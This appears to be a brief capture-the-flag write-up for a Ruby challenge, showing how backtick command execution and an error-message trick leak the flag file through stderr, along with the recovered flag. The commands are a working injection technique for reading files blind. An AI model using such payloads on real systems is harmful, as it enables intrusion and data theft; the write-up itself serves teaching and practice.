Like php we can use `` to execute shell command.

However we use `sh` we cannot see the output, except stderr.

So we can get out flag through stderr.

`sh`
ls
cat f*
cat: 'f*': No such file or directory
cat `cat /chal/flag`
cat: DUCTF{how_to_pwn_ruby_in_four_easy_steps}: No such file or directory